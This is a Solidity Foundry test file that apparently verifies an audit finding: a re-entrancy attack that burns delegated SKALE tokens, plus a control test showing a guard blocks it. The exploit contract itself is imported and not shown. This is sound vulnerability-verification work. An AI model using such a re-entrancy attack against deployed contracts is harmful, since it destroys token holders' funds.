// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    SkaleTokenGuarded,
    Victim
} from "./13843-users-can-burn-delegated-tokens-using-re-entrancy-attack-add.sol";

contract Finding13843Test is Test {
    function test_reentry_burns_100e18_of_delegated_tokens() public {
        Exploit e = new Exploit();
        assertEq(e.token().balanceOf(address(e.victim())), 0, "mint happens inside run");

        e.run();

        assertEq(e.balanceBefore(), 100 ether, "victim started with 100e18");
        assertEq(e.balanceAfter(), 0, "victim balance is now 0");
        assertEq(e.dropped(), 100 ether, "balance drop is 100e18");
        assertEq(e.victim().delegatedInCallback(), 100 ether, "callback delegated 100e18");
        assertEq(e.stillDelegated(), 100 ether, "delegation record still says 100e18");
        assertEq(e.token().balanceOf(address(e.victim())), 0, "the 100e18 was burned");
    }

    function test_control_guard_blocks_reentry_and_keeps_100e18() public {
        SkaleTokenGuarded guarded = new SkaleTokenGuarded();
        Victim victim = new Victim(guarded);
        guarded.mint(address(victim), 100 ether);
        guarded.registerSender(address(victim), address(victim));
        assertEq(guarded.balanceOf(address(victim)), 100 ether, "control starts at 100e18");

        bool burned;
        try victim.burnAll() {
            burned = true;
        } catch {
            burned = false;
        }

        assertFalse(burned, "guarded burn reverts when delegate reenters");
        assertEq(guarded.balanceOf(address(victim)), 100 ether, "victim balance stays 100e18");
        assertEq(guarded.delegatedOf(address(victim)), 0, "delegate did not stick");
        assertEq(victim.delegatedInCallback(), 0, "callback did not finish");
    }
}
